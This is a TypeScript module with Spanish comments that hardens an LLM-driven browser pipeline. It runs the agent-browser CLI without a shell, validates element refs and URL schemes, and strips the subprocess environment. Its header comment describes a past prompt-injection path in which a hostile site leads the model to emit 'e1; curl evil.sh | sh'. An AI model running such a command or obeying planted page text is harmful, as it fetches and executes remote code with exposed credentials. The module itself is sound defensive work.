/**
 * Ejecución del CLI de agent-browser sin pasar por un shell.
 *
 * Antes el pipeline armaba `execSync(\`agent-browser ${comando}\`)`, donde
 * `comando` podía incluir un `ref` elegido por el LLM a partir del snapshot de
 * un sitio de terceros. Un sitio hostil podía inducir al modelo a devolver
 * `e1; curl evil.sh | sh` y eso terminaba en un shell con el entorno del
 * proceso, incluidas las credenciales.
 *
 * Acá los comandos se pasan como array de argumentos con `shell: false`, así
 * que ningún metacarácter tiene significado: `;` o `&&` llegarían al CLI como
 * texto literal de un argumento. Además se valida el formato de los refs y se
 * resuelve el ejecutable local antes de invocarlo.
 */

import { execFileSync } from 'node:child_process'
import { existsSync } from 'node:fs'
import path from 'node:path'

/**
 * Formato de referencia que emite agent-browser en sus snapshots: `[ref=e1]`,
 * `[ref=e2]`, etc. Verificado contra el README del paquete instalado.
 * Cualquier cosa fuera de este patrón se rechaza.
 */
export const PATRON_REF = /^e[0-9]+$/

/** Límite defensivo: un snapshot real nunca tiene millones de elementos. */
const MAX_LARGO_REF = 12

export class RefInvalidoError extends Error {
  constructor(motivo: string) {
    // No se incluye el valor recibido en el mensaje: puede venir de un sitio
    // hostil y termina en logs.
    super(`Referencia de browser inválida: ${motivo}`)
    this.name = 'RefInvalidoError'
  }
}

export class EjecutableNoEncontradoError extends Error {
  constructor(ruta: string) {
    super(
      `No se encontró el ejecutable de agent-browser en ${ruta}. ` +
        'Instalalo con `npm ci` y `npx agent-browser install`.'
    )
    this.name = 'EjecutableNoEncontradoError'
  }
}

/**
 * Valida una referencia de elemento producida por el LLM o por el snapshot.
 *
 * @throws RefInvalidoError si no cumple exactamente `^e[0-9]+$`.
 */
export function validarRef(ref: unknown): string {
  if (typeof ref !== 'string') {
    throw new RefInvalidoError(`se esperaba string, llegó ${typeof ref}`)
  }
  if (ref.length === 0) {
    throw new RefInvalidoError('cadena vacía')
  }
  if (ref.length > MAX_LARGO_REF) {
    throw new RefInvalidoError(`excede ${MAX_LARGO_REF} caracteres`)
  }
  if (!PATRON_REF.test(ref)) {
    throw new RefInvalidoError('no cumple el formato ^e[0-9]+$')
  }
  return ref
}

/** Variante no lanzante, para descartar refs en un filtro. */
export function esRefValido(ref: unknown): ref is string {
  try {
    validarRef(ref)
    return true
  } catch {
    return false
  }
}

/** Regex fija, nunca construida a partir de entrada externa. */
const REF_EN_SNAPSHOT = /\[ref=(e[0-9]+)\]/

/**
 * Busca en el snapshot la referencia fresca del elemento cuyo texto coincide
 * con `titulo`.
 *
 * El código anterior construía un `new RegExp()` interpolando el título que
 * devolvía el LLM. Aunque escapaba metacaracteres, compilar un patrón a partir
 * de entrada externa es una superficie de ReDoS innecesaria. Acá se busca por
 * substring y se extrae el ref con una regex fija.
 *
 * @returns El ref validado, o null si no se encontró.
 */
export function extraerRefDeSnapshot(snapshot: string, titulo: string): string | null {
  const aguja = titulo.trim().slice(0, 40)
  if (aguja.length === 0) return null

  for (const linea of snapshot.split('\n')) {
    if (!linea.includes(aguja)) continue
    const m = linea.match(REF_EN_SNAPSHOT)
    if (m && esRefValido(m[1])) return m[1]
  }
  return null
}

/**
 * Resuelve el ejecutable local de agent-browser.
 *
 * Se usa la ruta explícita dentro de node_modules en lugar de confiar en el
 * PATH: evita depender de un binario global de versión desconocida y de
 * cualquier directorio inyectado en el PATH del entorno de ejecución.
 */
export function resolverEjecutable(cwd: string = process.cwd()): string {
  const nombre = process.platform === 'win32' ? 'agent-browser.cmd' : 'agent-browser'
  const ruta = path.join(cwd, 'node_modules', '.bin', nombre)
  if (!existsSync(ruta)) {
    throw new EjecutableNoEncontradoError(ruta)
  }
  return ruta
}

export interface OpcionesEjecucion {
  timeoutMs?: number
  cwd?: string
  /** Inyectable para poder testear sin lanzar procesos reales. */
  ejecutor?: Ejecutor
  /** Inyectable para testear sin exigir el binario instalado. */
  ejecutable?: string
}

/** Variables de entorno del subproceso. Tipo laxo a propósito: el ProcessEnv
 * de Next exige NODE_ENV, y acá se construye un entorno recortado. */
export type EntornoSubproceso = Record<string, string | undefined>

export type Ejecutor = (
  ejecutable: string,
  args: readonly string[],
  opciones: { timeout: number; cwd: string; encoding: 'utf-8'; shell: false; env: EntornoSubproceso }
) => string

const ejecutorReal: Ejecutor = (ejecutable, args, opciones) =>
  execFileSync(ejecutable, args as string[], {
    ...opciones,
    // execFileSync tipa env como NodeJS.ProcessEnv, que exige NODE_ENV. El
    // entorno recortado es intencionalmente parcial: el cast queda acotado a
    // esta única frontera con la API de Node.
    env: opciones.env as NodeJS.ProcessEnv,
  })

/**
 * Entorno mínimo para el subproceso. No se le pasa el entorno completo del
 * pipeline: el browser no necesita DATABASE_URL ni las API keys del LLM, y
 * navega sitios de terceros.
 */
export function entornoMinimo(env: EntornoSubproceso = process.env): EntornoSubproceso {
  const permitidas = ['PATH', 'HOME', 'TMPDIR', 'TEMP', 'TMP', 'LANG', 'LC_ALL', 'TZ']
  const minimo: EntornoSubproceso = {}
  for (const clave of permitidas) {
    if (env[clave] !== undefined) minimo[clave] = env[clave]
  }
  // agent-browser necesita saber dónde está Chromium si se instaló aparte.
  for (const clave of ['PLAYWRIGHT_BROWSERS_PATH', 'AGENT_BROWSER_HOME']) {
    if (env[clave] !== undefined) minimo[clave] = env[clave]
  }
  return minimo
}

/**
 * Ejecuta agent-browser con argumentos separados y sin shell.
 *
 * Devuelve stdout recortado, o cadena vacía si el comando falló o se pasó del
 * timeout — el pipeline ya trata la cadena vacía como "no se pudo obtener".
 *
 * @param args Argumentos ya separados. Nunca se concatena un string de comando.
 */
export function ejecutarBrowser(
  args: readonly string[],
  { timeoutMs = 30_000, cwd = process.cwd(), ejecutor = ejecutorReal, ejecutable }: OpcionesEjecucion = {}
): { ok: boolean; salida: string; error?: string } {
  const bin = ejecutable ?? resolverEjecutable(cwd)

  try {
    const salida = ejecutor(bin, args, {
      timeout: timeoutMs,
      cwd,
      encoding: 'utf-8',
      shell: false,
      env: entornoMinimo(),
    })
    return { ok: true, salida: (salida ?? '').trim() }
  } catch (error) {
    const err = error as NodeJS.ErrnoException & { killed?: boolean; stderr?: string | Buffer }
    const stderr = err.stderr ? String(err.stderr) : ''
    const motivo = err.killed
      ? `timeout tras ${timeoutMs}ms`
      : stderr.slice(0, 200) || err.message || 'error desconocido'
    return { ok: false, salida: '', error: motivo }
  }
}

// ════════════════════════════════════════════
// CONSTRUCTORES DE COMANDO
// ════════════════════════════════════════════
// Cada comando del pipeline se arma como array. Las funciones que reciben datos
// externos validan antes de construir.

export const comandos = {
  version: (): string[] => ['--version'],
  abrir: (url: string): string[] => ['open', validarUrlNavegable(url)],
  abrirEnBlanco: (): string[] => ['open', 'about:blank'],
  esperarCarga: (): string[] => ['wait', '--load', 'networkidle'],
  snapshotInteractivo: (): string[] => ['snapshot', '-i', '-c'],
  snapshotSelector: (selector: string): string[] => ['snapshot', '-s', selector, '-c'],
  getUrl: (): string[] => ['get', 'url'],
  getTitulo: (): string[] => ['get', 'title'],
  getTexto: (selector: string): string[] => ['get', 'text', selector],
  /** El ref viene del LLM: se valida antes de construir el comando. */
  clickNuevaTab: (ref: string): string[] => ['click', `@${validarRef(ref)}`, '--new-tab'],
  tab: (indice: number): string[] => ['tab', String(validarIndiceTab(indice))],
  cerrarTab: (): string[] => ['tab', 'close'],
  cerrar: (): string[] => ['close'],
} as const

function validarIndiceTab(indice: number): number {
  if (!Number.isInteger(indice) || indice < 0 || indice > 50) {
    throw new RefInvalidoError('índice de tab fuera de rango')
  }
  return indice
}

/**
 * Valida una URL antes de navegar. Solo HTTPS y HTTP: nada de `file:`,
 * `javascript:`, `data:` ni esquemas desconocidos.
 *
 * Nota: esto no es control de SSRF completo (dominio, redirects e IP final se
 * abordan en la Fase 5 del plan). Es la validación de esquema mínima para que
 * el pipeline no navegue a un esquema arbitrario.
 */
export function validarUrlNavegable(url: string): string {
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    throw new RefInvalidoError('URL no parseable')
  }
  if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
    throw new RefInvalidoError(`esquema no permitido: ${parsed.protocol}`)
  }
  return parsed.toString()
}
